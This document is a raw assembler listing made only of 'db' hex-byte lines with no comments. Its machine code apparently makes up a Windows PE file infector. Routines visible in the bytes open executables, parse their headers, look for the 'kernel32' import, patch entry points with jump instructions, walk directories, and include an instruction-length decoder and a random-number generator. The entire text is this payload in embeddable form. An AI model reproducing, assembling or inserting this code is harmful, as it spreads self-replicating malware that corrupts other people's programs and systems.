db 0e8h, 005h, 0f7h, 0ffh, 0ffh, 08bh, 0d8h, 08dh, 045h, 00ch, 050h, 08bh, 045h, 010h
db 003h, 0f0h, 08dh, 085h, 0e8h, 0f6h, 0ffh, 0ffh, 056h, 057h, 050h, 0ffh, 075h, 008h
db 0e8h, 039h, 001h, 000h, 000h, 08bh, 0f0h, 083h, 0c4h, 034h, 085h, 0f6h, 074h, 01bh
db 083h, 07dh, 0f8h, 000h, 074h, 015h, 0ffh, 075h, 0f8h, 0ffh, 075h, 0f4h, 053h, 0ffh
db 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 00ah, 000h, 000h, 000h, 083h, 0c4h, 014h, 08bh
db 0c6h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 00ch, 009h, 000h
db 000h, 056h, 08dh, 085h, 0f4h, 0f6h, 0ffh, 0ffh, 057h, 050h, 0ffh, 075h, 008h, 0e8h
db 0f6h, 0f5h, 0ffh, 0ffh, 08bh, 075h, 018h, 059h, 081h, 0feh, 0f4h, 001h, 000h, 000h
db 059h, 072h, 01fh, 08bh, 045h, 014h, 056h, 02bh, 045h, 00ch, 06ah, 001h, 083h, 0e8h
db 005h, 089h, 045h, 0fch, 0ffh, 015h, 008h, 04dh, 000h, 000h, 08bh, 0f8h, 033h, 0c0h
db 059h, 03bh, 0f8h, 059h, 075h, 007h, 033h, 0c0h, 0e9h, 0bdh, 000h, 000h, 000h, 083h
db 0c6h, 0fbh, 053h, 0d1h, 0eeh, 056h, 057h, 068h, 0ffh, 000h, 000h, 000h, 050h, 050h
db 050h, 06ah, 007h, 0e8h, 0f1h, 0e4h, 0ffh, 0ffh, 08bh, 0f0h, 08bh, 045h, 010h, 068h
db 074h, 014h, 000h, 000h, 0c6h, 004h, 03eh, 0e9h, 046h, 0ffh, 075h, 008h, 02bh, 0c6h
db 02bh, 045h, 014h, 040h, 089h, 004h, 03eh, 083h, 0c6h, 004h, 0ffh, 015h, 0d0h, 04ch
db 000h, 000h, 08bh, 0d8h, 083h, 0c4h, 024h, 085h, 0dbh, 075h, 004h, 033h, 0f6h, 0ebh
db 06ah, 06ah, 000h, 08dh, 085h, 0f4h, 0f6h, 0ffh, 0ffh, 0ffh, 075h, 014h, 050h, 0e8h
db 056h, 0f6h, 0ffh, 0ffh, 059h, 059h, 050h, 053h, 0ffh, 015h, 0e0h, 04ch, 000h, 000h
db 053h, 056h, 06ah, 001h, 057h, 0ffh, 015h, 0dch, 04ch, 000h, 000h, 083h, 0c4h, 01ch
db 03bh, 0c6h, 074h, 004h, 033h, 0f6h, 0ebh, 031h, 08bh, 045h, 00ch, 06ah, 000h, 040h
db 050h, 08dh, 085h, 0f4h, 0f6h, 0ffh, 0ffh, 050h, 0e8h, 023h, 0f6h, 0ffh, 0ffh, 059h
db 059h, 050h, 053h, 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 053h, 06ah, 001h, 05eh, 08dh
db 045h, 0fch, 056h, 06ah, 004h, 050h, 0ffh, 015h, 0dch, 04ch, 000h, 000h, 083h, 0c4h
db 01ch, 053h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 059h, 057h, 0ffh, 015h, 00ch, 04dh
db 000h, 000h, 059h, 08bh, 0c6h, 05bh, 05fh, 05eh, 0c9h, 0c3h, 055h, 08bh, 0ech, 083h
db 0ech, 018h, 056h, 08dh, 045h, 0f4h, 057h, 050h, 08bh, 07dh, 00ch, 08dh, 045h, 0f0h
db 050h, 08dh, 045h, 0f8h, 050h, 08dh, 045h, 0ech, 050h, 057h, 0ffh, 075h, 008h, 033h
db 0f6h, 089h, 075h, 0f8h, 089h, 075h, 0f0h, 089h, 075h, 0f4h, 089h, 075h, 0e8h, 089h
db 075h, 0ech, 0e8h, 077h, 002h, 000h, 000h, 083h, 0c4h, 018h, 085h, 0c0h, 074h, 017h
db 068h, 074h, 014h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h, 0d0h, 04ch, 000h, 000h
db 059h, 03bh, 0c6h, 059h, 089h, 045h, 0fch, 075h, 007h, 033h, 0c0h, 0e9h, 04eh, 002h
db 000h, 000h, 0ffh, 075h, 014h, 057h, 0e8h, 04dh, 0f5h, 0ffh, 0ffh, 08bh, 057h, 074h
db 08bh, 04dh, 0f8h, 08bh, 07dh, 010h, 02bh, 0cah, 02bh, 0c1h, 003h, 0d7h, 089h, 045h
db 0e8h, 08bh, 045h, 018h, 068h, 000h, 028h, 000h, 000h, 06ah, 001h, 089h, 055h, 010h
db 089h, 008h, 0ffh, 015h, 008h, 04dh, 000h, 000h, 08bh, 0f8h, 083h, 0c4h, 010h, 03bh
db 0feh, 00fh, 084h, 005h, 002h, 000h, 000h, 053h, 0bbh, 000h, 002h, 000h, 000h, 053h
db 06ah, 001h, 0e8h, 0a9h, 009h, 000h, 000h, 050h, 08dh, 047h, 005h, 050h, 068h, 0ffh
db 000h, 000h, 000h, 056h, 056h, 056h, 06ah, 007h, 0e8h, 08eh, 0e3h, 0ffh, 0ffh, 08bh
db 0f0h, 053h, 083h, 0c6h, 005h, 06ah, 001h, 0c6h, 004h, 03eh, 060h, 046h, 0e8h, 083h
db 009h, 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0c0h, 06ah, 010h, 050h, 050h
db 050h, 06ah, 007h, 0e8h, 069h, 0e3h, 0ffh, 0ffh, 083h, 0c4h, 048h, 003h, 0f0h, 080h
db 00ch, 03eh, 0ffh, 0ffh, 075h, 00ch, 046h, 0ffh, 075h, 008h, 0c6h, 004h, 03eh, 035h
db 046h, 0e8h, 026h, 003h, 000h, 000h, 053h, 089h, 004h, 03eh, 06ah, 001h, 083h, 0c6h
db 004h, 0e8h, 048h, 009h, 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0c0h, 06ah
db 010h, 050h, 050h, 050h, 06ah, 007h, 0e8h, 02eh, 0e3h, 0ffh, 0ffh, 003h, 0f0h, 08bh
db 045h, 010h, 053h, 06ah, 001h, 0c6h, 004h, 03eh, 068h, 089h, 044h, 03eh, 001h, 083h
db 0c6h, 005h, 0e8h, 01dh, 009h, 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0c0h
db 06ah, 010h, 050h, 050h, 050h, 06ah, 007h, 0e8h, 003h, 0e3h, 0ffh, 0ffh, 083h, 0c4h
db 050h, 003h, 0f0h, 053h, 0c6h, 004h, 03eh, 0c3h, 06ah, 001h, 046h, 0e8h, 0f8h, 008h
db 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0c0h, 06ah, 010h, 050h, 050h, 050h
db 06ah, 007h, 0e8h, 0deh, 0e2h, 0ffh, 0ffh, 003h, 0f0h, 06ah, 007h, 06ah, 000h, 0c6h
db 007h, 0e9h, 08dh, 046h, 0fbh, 089h, 047h, 001h, 0e8h, 01fh, 009h, 000h, 000h, 083h
db 0c4h, 02ch, 083h, 0f8h, 004h, 075h, 00dh, 06ah, 007h, 06ah, 000h, 0e8h, 00eh, 009h
db 000h, 000h, 059h, 059h, 0ebh, 0eeh, 004h, 058h, 053h, 088h, 004h, 03eh, 06ah, 001h
db 046h, 0e8h, 0aeh, 008h, 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0c0h, 06ah
db 010h, 050h, 050h, 050h, 06ah, 007h, 0e8h, 094h, 0e2h, 0ffh, 0ffh, 003h, 0f0h, 06ah
db 0feh, 08dh, 004h, 03eh, 050h, 06ah, 010h, 0ffh, 075h, 0f4h, 0ffh, 075h, 0f8h, 06ah
db 004h, 06ah, 000h, 0e8h, 07bh, 0e2h, 0ffh, 0ffh, 083h, 0c4h, 040h, 003h, 0f0h, 053h
db 06ah, 001h, 0e8h, 075h, 008h, 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0c0h
db 06ah, 010h, 050h, 050h, 050h, 06ah, 007h, 0e8h, 05bh, 0e2h, 0ffh, 0ffh, 003h, 0f0h
db 053h, 06ah, 001h, 0c6h, 004h, 03eh, 061h, 046h, 0e8h, 053h, 008h, 000h, 000h, 050h
db 08dh, 004h, 03eh, 050h, 033h, 0c0h, 068h, 0ffh, 000h, 000h, 000h, 050h, 050h, 050h
db 06ah, 007h, 0e8h, 036h, 0e2h, 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 048h, 0c6h, 004h
db 03eh, 068h, 08bh, 045h, 0f0h, 053h, 089h, 044h, 03eh, 001h, 06ah, 001h, 083h, 0c6h
db 005h, 0e8h, 022h, 008h, 000h, 000h, 050h, 08dh, 004h, 03eh, 050h, 033h, 0dbh, 068h
db 0ffh, 000h, 000h, 000h, 053h, 053h, 053h, 06ah, 007h, 0e8h, 005h, 0e2h, 0ffh, 0ffh
db 053h, 003h, 0f0h, 0ffh, 075h, 014h, 0c6h, 004h, 03eh, 0c3h, 0ffh, 075h, 0fch, 0ffh
db 015h, 0e0h, 04ch, 000h, 000h, 0ffh, 075h, 0fch, 046h, 06ah, 001h, 056h, 057h, 0ffh
db 015h, 0dch, 04ch, 000h, 000h, 083h, 0c4h, 040h, 085h, 0c0h, 075h, 004h, 033h, 0f6h
db 0ebh, 025h, 08bh, 045h, 0ech, 053h, 040h, 050h, 0ffh, 075h, 0fch, 0ffh, 015h, 0e0h
db 04ch, 000h, 000h, 0ffh, 075h, 0fch, 08dh, 045h, 0e8h, 06ah, 001h, 05eh, 056h, 06ah
db 004h, 050h, 0ffh, 015h, 0dch, 04ch, 000h, 000h, 083h, 0c4h, 01ch, 057h, 0ffh, 015h
db 00ch, 04dh, 000h, 000h, 059h, 05bh, 0ffh, 075h, 0fch, 0ffh, 015h, 0d4h, 04ch, 000h
db 000h, 059h, 08bh, 0c6h, 05fh, 05eh, 0c9h, 0c3h, 055h, 08bh, 0ech, 083h, 0ech, 034h
db 053h, 056h, 0beh, 010h, 027h, 000h, 000h, 057h, 0c7h, 045h, 0fch, 014h, 000h, 000h
db 000h, 089h, 075h, 0f4h, 0e8h, 008h, 007h, 000h, 000h, 0a8h, 001h, 074h, 003h, 056h
db 0ebh, 002h, 06ah, 008h, 06ah, 002h, 0e8h, 075h, 007h, 000h, 000h, 059h, 089h, 045h
db 0f8h, 059h, 068h, 074h, 014h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h, 0d0h, 04ch
db 000h, 000h, 08bh, 0f0h, 059h, 085h, 0f6h, 059h, 089h, 075h, 008h, 074h, 033h, 08bh
db 05dh, 00ch, 06ah, 000h, 08bh, 043h, 03ch, 005h, 0f8h, 000h, 000h, 000h, 050h, 056h
db 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 056h, 06ah, 001h, 08dh, 045h, 0cch, 06ah, 028h
db 050h, 0ffh, 015h, 0d8h, 04ch, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 075h, 00fh
db 056h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 059h, 033h, 0c0h, 0e9h, 0e8h, 000h, 000h
db 000h, 0ffh, 075h, 0dch, 06ah, 001h, 0ffh, 015h, 008h, 04dh, 000h, 000h, 08bh, 0f8h
db 059h, 085h, 0ffh, 059h, 074h, 0deh, 06ah, 000h, 0ffh, 075h, 0e0h, 056h, 0ffh, 015h
db 0e0h, 04ch, 000h, 000h, 056h, 06ah, 001h, 0ffh, 075h, 0dch, 057h, 0ffh, 015h, 0d8h
db 04ch, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 075h, 007h, 033h, 0f6h, 0e9h, 09ah
db 000h, 000h, 000h, 08bh, 0f7h, 056h, 0e8h, 0afh, 004h, 000h, 000h, 003h, 0f0h, 059h
db 085h, 0c0h, 07eh, 0eah, 08bh, 045h, 0dch, 08dh, 044h, 038h, 09ch, 03bh, 0f0h, 076h
db 03ah, 0ffh, 075h, 008h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 057h, 0ffh, 015h, 00ch
db 04dh, 000h, 000h, 083h, 07dh, 0fch, 000h, 059h, 059h, 074h, 08dh, 0ffh, 075h, 0f4h
db 08bh, 0f7h, 06ah, 002h, 0e8h, 0a5h, 006h, 000h, 000h, 050h, 06ah, 002h, 089h, 045h
db 0f4h, 0e8h, 09ah, 006h, 000h, 000h, 083h, 0c4h, 010h, 0ffh, 04dh, 0fch, 089h, 045h
db 0f8h, 0ebh, 0aeh, 080h, 03eh, 0e8h, 075h, 0a9h, 0e8h, 008h, 006h, 000h, 000h, 033h
db 0d2h, 0f7h, 075h, 0f8h, 085h, 0d2h, 074h, 002h, 0ebh, 099h, 08bh, 045h, 0e0h, 08bh
db 04dh, 010h, 02bh, 0c7h, 08bh, 055h, 01ch, 003h, 0c6h, 06ah, 001h, 089h, 001h, 08bh
db 043h, 074h, 08bh, 04dh, 014h, 02bh, 0c7h, 003h, 045h, 0d8h, 003h, 0c6h, 089h, 001h
db 08bh, 046h, 001h, 089h, 002h, 08bh, 009h, 05eh, 08dh, 044h, 001h, 005h, 08bh, 04dh
db 018h, 089h, 001h, 0ffh, 075h, 008h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 057h, 0ffh
db 015h, 00ch, 04dh, 000h, 000h, 059h, 08bh, 0c6h, 059h, 05fh, 05eh, 05bh, 0c9h, 0c3h
db 055h, 08bh, 0ech, 083h, 0ech, 01ch, 053h, 056h, 057h, 068h, 074h, 014h, 000h, 000h
db 0ffh, 075h, 008h, 0ffh, 015h, 0d0h, 04ch, 000h, 000h, 08bh, 0f0h, 059h, 085h, 0f6h
db 059h, 00fh, 084h, 0f7h, 000h, 000h, 000h, 08bh, 05dh, 00ch, 0ffh, 0b3h, 0c0h, 000h
db 000h, 000h, 053h, 0e8h, 09eh, 0f1h, 0ffh, 0ffh, 06ah, 000h, 050h, 056h, 0ffh, 015h
db 0e0h, 04ch, 000h, 000h, 083h, 0c4h, 014h, 056h, 06ah, 001h, 08dh, 045h, 0e4h, 06ah
db 014h, 050h, 0ffh, 015h, 0d8h, 04ch, 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 00fh
db 084h, 0b9h, 000h, 000h, 000h, 083h, 07dh, 0e4h, 000h, 056h, 00fh, 084h, 0afh, 000h
db 000h, 000h, 0ffh, 015h, 0e8h, 04ch, 000h, 000h, 059h, 08bh, 0f8h, 06ah, 000h, 0ffh
db 075h, 0f0h, 053h, 0e8h, 058h, 0f1h, 0ffh, 0ffh, 059h, 059h, 050h, 056h, 0ffh, 015h
db 0e0h, 04ch, 000h, 000h, 056h, 06ah, 001h, 08dh, 045h, 0f8h, 06ah, 008h, 050h, 0ffh
db 015h, 0d8h, 04ch, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 07ah, 06ah, 000h
db 057h, 056h, 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 083h, 0c4h, 00ch, 080h, 07dh, 0f8h
db 06bh, 074h, 006h, 080h, 07dh, 0f8h, 04bh, 075h, 08eh, 080h, 07dh, 0f9h, 065h, 074h
db 006h, 080h, 07dh, 0f9h, 045h, 075h, 082h, 080h, 07dh, 0fah, 072h, 074h, 00ah, 080h
db 07dh, 0fah, 052h, 00fh, 085h, 072h, 0ffh, 0ffh, 0ffh, 080h, 07dh, 0fbh, 06eh, 074h
db 00ah, 080h, 07dh, 0fbh, 04eh, 00fh, 085h, 062h, 0ffh, 0ffh, 0ffh, 080h, 07dh, 0fch
db 065h, 074h, 00ah, 080h, 07dh, 0fch, 045h, 00fh, 085h, 052h, 0ffh, 0ffh, 0ffh, 080h
db 07dh, 0fdh, 06ch, 074h, 00ah, 080h, 07dh, 0fdh, 04ch, 00fh, 085h, 042h, 0ffh, 0ffh
db 0ffh, 080h, 07dh, 0feh, 033h, 00fh, 085h, 038h, 0ffh, 0ffh, 0ffh, 080h, 07dh, 0ffh
db 032h, 074h, 011h, 0e9h, 02dh, 0ffh, 0ffh, 0ffh, 056h, 0ffh, 015h, 0d4h, 04ch, 000h
db 000h, 059h, 033h, 0c0h, 0ebh, 00eh, 056h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 08bh
db 043h, 074h, 059h, 003h, 045h, 0f4h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h, 08bh, 0ech
db 056h, 057h, 0e8h, 078h, 004h, 000h, 000h, 06ah, 00ah, 033h, 0d2h, 059h, 0bfh, 0e8h
db 003h, 000h, 000h, 0f7h, 0f1h, 085h, 0d2h, 075h, 005h, 057h, 06ah, 064h, 0ebh, 004h
db 06ah, 014h, 06ah, 00ah, 0e8h, 025h, 005h, 000h, 000h, 059h, 08bh, 0f0h, 059h, 0c1h
db 0e6h, 00ah, 0e8h, 04eh, 004h, 000h, 000h, 033h, 0d2h, 08bh, 0cfh, 0f7h, 0f1h, 085h
db 0d2h, 075h, 00eh, 057h, 057h, 0e8h, 008h, 005h, 000h, 000h, 059h, 08bh, 0f0h, 059h
db 0c1h, 0e6h, 00ah, 0ffh, 075h, 008h, 0e8h, 03ch, 0f6h, 0ffh, 0ffh, 085h, 0c0h, 059h
db 074h, 027h, 0e8h, 024h, 004h, 000h, 000h, 0a8h, 001h, 074h, 009h, 0ffh, 075h, 008h
db 0e8h, 06bh, 0f5h, 0ffh, 0ffh, 059h, 0ffh, 075h, 014h, 056h, 0ffh, 075h, 010h, 0ffh
db 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0e5h, 0f6h, 0ffh, 0ffh, 083h, 0c4h, 014h, 05fh
db 05eh, 05dh, 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 050h, 003h, 000h, 000h, 08bh, 045h
db 008h, 053h, 033h, 0dbh, 033h, 0c9h, 056h, 03bh, 0c3h, 057h, 089h, 05dh, 0fch, 00fh
db 084h, 0b8h, 001h, 000h, 000h, 08ah, 010h, 06ah, 001h, 08dh, 0b5h, 0f4h, 0feh, 0ffh
db 0ffh, 05fh, 02bh, 0f0h, 02bh, 0f8h, 0ebh, 002h, 033h, 0dbh, 088h, 014h, 006h, 08ah
db 050h, 001h, 041h, 040h, 03ah, 0d3h, 074h, 01eh, 08dh, 01ch, 007h, 081h, 0fbh, 004h
db 001h, 000h, 000h, 00fh, 084h, 08ah, 001h, 000h, 000h, 081h, 0f9h, 004h, 001h, 000h
db 000h, 072h, 0dbh, 08bh, 07dh, 0fch, 033h, 0dbh, 0ebh, 046h, 08dh, 051h, 001h, 0beh
db 004h, 001h, 000h, 000h, 03bh, 0d6h, 00fh, 083h, 06bh, 001h, 000h, 000h, 080h, 0bch
db 00dh, 0f3h, 0feh, 0ffh, 0ffh, 05ch, 08dh, 084h, 00dh, 0f4h, 0feh, 0ffh, 0ffh, 074h
db 019h, 083h, 0c1h, 002h, 03bh, 0ceh, 00fh, 083h, 04fh, 001h, 000h, 000h, 08bh, 0cah
db 0c6h, 000h, 05ch, 08dh, 084h, 00dh, 0f4h, 0feh, 0ffh, 0ffh, 088h, 018h, 0c6h, 000h
db 02ah, 08bh, 0f8h, 088h, 09ch, 00dh, 0f5h, 0feh, 0ffh, 0ffh, 08ah, 08dh, 0f4h, 0feh
db 0ffh, 0ffh, 033h, 0c0h, 03ah, 0cbh, 074h, 011h, 088h, 08ch, 005h, 0b0h, 0fch, 0ffh
db 0ffh, 08ah, 08ch, 005h, 0f5h, 0feh, 0ffh, 0ffh, 040h, 0ebh, 0ebh, 088h, 09ch, 005h
db 0b0h, 0fch, 0ffh, 0ffh, 0a1h, 024h, 04dh, 000h, 000h, 03bh, 0c3h, 075h, 018h, 068h
db 0a4h, 014h, 000h, 000h, 0ffh, 015h, 0c8h, 04ch, 000h, 000h, 03bh, 0c3h, 0a3h, 024h
db 04dh, 000h, 000h, 00fh, 084h, 0f0h, 000h, 000h, 000h, 068h, 094h, 014h, 000h, 000h
db 050h, 0ffh, 015h, 0cch, 04ch, 000h, 000h, 068h, 084h, 014h, 000h, 000h, 08bh, 0f0h
db 0ffh, 035h, 024h, 04dh, 000h, 000h, 0ffh, 015h, 0cch, 04ch, 000h, 000h, 068h, 078h
db 014h, 000h, 000h, 089h, 045h, 008h, 0ffh, 035h, 024h, 04dh, 000h, 000h, 0ffh, 015h
db 0cch, 04ch, 000h, 000h, 03bh, 0f3h, 089h, 045h, 0fch, 00fh, 084h, 0b2h, 000h, 000h
db 000h, 039h, 05dh, 008h, 00fh, 084h, 0a9h, 000h, 000h, 000h, 08dh, 085h, 0b4h, 0fdh
db 0ffh, 0ffh, 050h, 08dh, 085h, 0b0h, 0fch, 0ffh, 0ffh, 050h, 0ffh, 0d6h, 083h, 0f8h
db 0ffh, 089h, 045h, 0f8h, 00fh, 084h, 088h, 000h, 000h, 000h, 033h, 0c0h, 038h, 09dh
db 0e0h, 0fdh, 0ffh, 0ffh, 074h, 062h, 08bh, 0cfh, 08dh, 095h, 0e0h, 0fdh, 0ffh, 0ffh
db 02bh, 0cah, 08bh, 0d0h, 08dh, 0b5h, 0f4h, 0feh, 0ffh, 0ffh, 02bh, 0d6h, 003h, 0d7h
db 081h, 0fah, 004h, 001h, 000h, 000h, 073h, 01dh, 08ah, 094h, 005h, 0e0h, 0fdh, 0ffh
db 0ffh, 08dh, 034h, 001h, 040h, 088h, 094h, 035h, 0e0h, 0fdh, 0ffh, 0ffh, 038h, 09ch
db 005h, 0e0h, 0fdh, 0ffh, 0ffh, 075h, 0d1h, 0ebh, 002h, 033h, 0c0h, 03bh, 0c3h, 074h
db 021h, 0ffh, 075h, 01ch, 088h, 01ch, 038h, 08dh, 085h, 0f4h, 0feh, 0ffh, 0ffh, 0ffh
db 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 050h, 0e8h, 0cah
db 0fdh, 0ffh, 0ffh, 083h, 0c4h, 018h, 08dh, 085h, 0b4h, 0fdh, 0ffh, 0ffh, 050h, 0ffh
db 075h, 0f8h, 0ffh, 055h, 008h, 085h, 0c0h, 075h, 083h, 039h, 05dh, 0fch, 074h, 006h
db 0ffh, 075h, 0f8h, 0ffh, 055h, 0fch, 06ah, 001h, 058h, 0ebh, 002h, 033h, 0c0h, 05fh
db 05eh, 05bh, 0c9h, 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 004h, 001h, 000h, 000h, 0a1h
db 024h, 04dh, 000h, 000h, 085h, 0c0h, 075h, 014h, 068h, 0a4h, 014h, 000h, 000h, 0ffh
db 015h, 0c8h, 04ch, 000h, 000h, 085h, 0c0h, 0a3h, 024h, 04dh, 000h, 000h, 074h, 047h
db 068h, 0b4h, 014h, 000h, 000h, 050h, 0ffh, 015h, 0cch, 04ch, 000h, 000h, 085h, 0c0h
db 074h, 037h, 08dh, 08dh, 0fch, 0feh, 0ffh, 0ffh, 051h, 068h, 004h, 001h, 000h, 000h
db 0ffh, 0d0h, 080h, 0bdh, 0fch, 0feh, 0ffh, 0ffh, 000h, 074h, 020h, 0ffh, 075h, 018h
db 08dh, 085h, 0fch, 0feh, 0ffh, 0ffh, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h
db 00ch, 0ffh, 075h, 008h, 050h, 0e8h, 0bbh, 0fdh, 0ffh, 0ffh, 083h, 0c4h, 018h, 0c9h
db 0c3h, 033h, 0c0h, 0c9h, 0c3h, 0cch, 060h, 0fch, 033h, 0d2h, 08bh, 074h, 024h, 024h
db 08bh, 0ech, 068h, 01ch, 0f7h, 097h, 010h, 068h, 080h, 067h, 01ch, 0f7h, 068h, 018h
db 097h, 038h, 017h, 068h, 018h, 0b7h, 01ch, 010h, 068h, 017h, 02ch, 030h, 017h, 068h
db 017h, 030h, 017h, 018h, 068h, 047h, 0f5h, 015h, 0f7h, 068h, 048h, 037h, 010h, 04ch
db 068h, 0f7h, 0e7h, 02ch, 027h, 068h, 087h, 060h, 0ach, 0f7h, 068h, 052h, 01ch, 012h
db 01ch, 068h, 01ch, 087h, 010h, 07ch, 068h, 01ch, 070h, 01ch, 020h, 068h, 02bh, 060h
db 067h, 047h, 068h, 011h, 010h, 021h, 020h, 068h, 025h, 016h, 012h, 040h, 068h, 022h
db 020h, 087h, 082h, 068h, 020h, 012h, 020h, 047h, 068h, 019h, 014h, 010h, 013h, 068h
db 013h, 010h, 027h, 018h, 068h, 060h, 082h, 085h, 028h, 068h, 045h, 040h, 012h, 015h
db 068h, 0c7h, 0a0h, 016h, 050h, 068h, 012h, 018h, 019h, 028h, 068h, 012h, 018h, 040h
db 0f2h, 068h, 027h, 041h, 015h, 019h, 068h, 011h, 0f0h, 0f0h, 050h, 0b9h, 010h, 047h
db 012h, 015h, 051h, 068h, 047h, 012h, 015h, 011h, 068h, 012h, 015h, 011h, 010h, 068h
db 015h, 011h, 010h, 047h, 0b8h, 015h, 020h, 047h, 012h, 050h, 050h, 068h, 010h, 01ah
db 047h, 012h, 080h, 0c1h, 010h, 051h, 080h, 0e9h, 020h, 051h, 033h, 0c9h, 049h, 041h
db 08bh, 0fch, 0ach, 08ah, 0f8h, 08ah, 027h, 047h, 0c0h, 0ech, 004h, 02ah, 0c4h, 073h
db 0f6h, 08ah, 047h, 0ffh, 024h, 00fh, 03ch, 00ch, 075h, 003h, 05ah, 0f7h, 0d2h, 042h
db 03ch, 000h, 074h, 042h, 03ch, 001h, 074h, 0dbh, 083h, 0c7h, 051h, 03ch, 00ah, 074h
db 0d7h, 08bh, 07dh, 024h, 042h, 03ch, 002h, 074h, 02fh, 03ch, 007h, 074h, 033h, 03ch
db 00bh, 00fh, 084h, 07eh, 000h, 000h, 000h, 042h, 03ch, 003h, 074h, 01eh, 03ch, 008h
db 074h, 022h, 042h, 03ch, 004h, 074h, 015h, 042h, 042h, 060h, 0b0h, 066h, 0f2h, 0aeh
db 061h, 075h, 002h, 04ah, 04ah, 03ch, 009h, 074h, 00dh, 02ch, 005h, 074h, 06ch, 042h
db 08bh, 0e5h, 089h, 054h, 024h, 01ch, 061h, 0c3h, 0ach, 08ah, 0e0h, 0c0h, 0e8h, 007h
db 072h, 012h, 074h, 014h, 080h, 0c2h, 004h, 060h, 0b0h, 067h, 0f2h, 0aeh, 061h, 075h
db 009h, 080h, 0eah, 003h, 0feh, 0c8h, 075h, 0dch, 042h, 040h, 080h, 0e4h, 007h, 060h
db 0b0h, 067h, 0f2h, 0aeh, 061h, 074h, 013h, 080h, 0fch, 004h, 074h, 017h, 080h, 0fch
db 005h, 075h, 0c5h, 0feh, 0c8h, 074h, 0c1h, 080h, 0c2h, 004h, 0ebh, 0bch, 066h, 03dh
db 000h, 006h, 075h, 0b6h, 042h, 0ebh, 0b2h, 03ch, 000h, 075h, 0aeh, 0ach, 024h, 007h
db 02ch, 005h, 075h, 0a7h, 042h, 0ebh, 0e4h, 0f6h, 006h, 038h, 075h, 0a8h, 0b0h, 008h
db 0d0h, 0efh, 014h, 000h, 0e9h, 072h, 0ffh, 0ffh, 0ffh, 080h, 0efh, 0a0h, 080h, 0ffh
db 004h, 073h, 082h, 060h, 0b0h, 067h, 0f2h, 0aeh, 061h, 075h, 002h, 04ah, 04ah, 060h
db 0b0h, 066h, 0f2h, 0aeh, 061h, 00fh, 084h, 076h, 0ffh, 0ffh, 0ffh, 00fh, 085h, 066h
db 0ffh, 0ffh, 0ffh, 056h, 033h, 0f6h, 039h, 035h, 0c4h, 04ch, 000h, 000h, 075h, 033h
db 0a1h, 0f4h, 04ch, 000h, 000h, 03bh, 0c6h, 074h, 004h, 0ffh, 0d0h, 0ebh, 00fh, 0a1h
db 0f0h, 04ch, 000h, 000h, 03bh, 0c6h, 074h, 004h, 0ffh, 0d0h, 0ebh, 002h, 033h, 0c0h
db 08bh, 00dh, 0ech, 04ch, 000h, 000h, 0a3h, 0c4h, 04ch, 000h, 000h, 03bh, 0ceh, 074h
db 008h, 03bh, 0c6h, 074h, 004h, 050h, 0ffh, 0d1h, 059h, 0a1h, 0f0h, 04ch, 000h, 000h
db 03bh, 0c6h, 074h, 032h, 057h, 0ffh, 0d0h, 08bh, 0f0h, 0bfh, 0ffh, 000h, 000h, 000h
db 023h, 0f7h, 0ffh, 015h, 0f0h, 04ch, 000h, 000h, 0c1h, 0e0h, 008h, 00bh, 0f0h, 0c1h
db 0e6h, 008h, 0ffh, 015h, 0f0h, 04ch, 000h, 000h, 023h, 0c7h, 00bh, 0f0h, 0c1h, 0e6h
db 008h, 0ffh, 015h, 0f0h, 04ch, 000h, 000h, 023h, 0c7h, 05fh, 00bh, 0f0h, 08bh, 0c6h
db 05eh, 0c3h, 053h, 08bh, 05ch, 024h, 008h, 057h, 08bh, 07ch, 024h, 010h, 02bh, 0fbh
db 074h, 03bh, 083h, 0ffh, 001h, 075h, 00eh, 0e8h, 06bh, 0ffh, 0ffh, 0ffh, 0a8h, 001h
db 075h, 02dh, 08dh, 043h, 001h, 0ebh, 02ah, 08bh, 0c7h, 056h, 0c1h, 0e8h, 010h, 050h
db 06ah, 000h, 0e8h, 01fh, 000h, 000h, 000h, 08bh, 0f0h, 00fh, 0b7h, 0c7h, 050h, 06ah
db 000h, 0c1h, 0e6h, 010h, 0e8h, 00fh, 000h, 000h, 000h, 083h, 0c4h, 010h, 00bh, 0c6h
db 003h, 0c3h, 05eh, 0ebh, 002h, 08bh, 0c3h, 05fh, 05bh, 0c3h, 056h, 08bh, 074h, 024h
db 00ch, 057h, 08bh, 07ch, 024h, 00ch, 02bh, 0f7h, 066h, 085h, 0f6h, 076h, 02eh, 066h
db 083h, 0feh, 001h, 075h, 00eh, 0e8h, 019h, 0ffh, 0ffh, 0ffh, 0a8h, 001h, 075h, 01fh
db 08dh, 047h, 001h, 0ebh, 01ch, 0e8h, 00bh, 0ffh, 0ffh, 0ffh, 0b9h, 0ffh, 0ffh, 000h
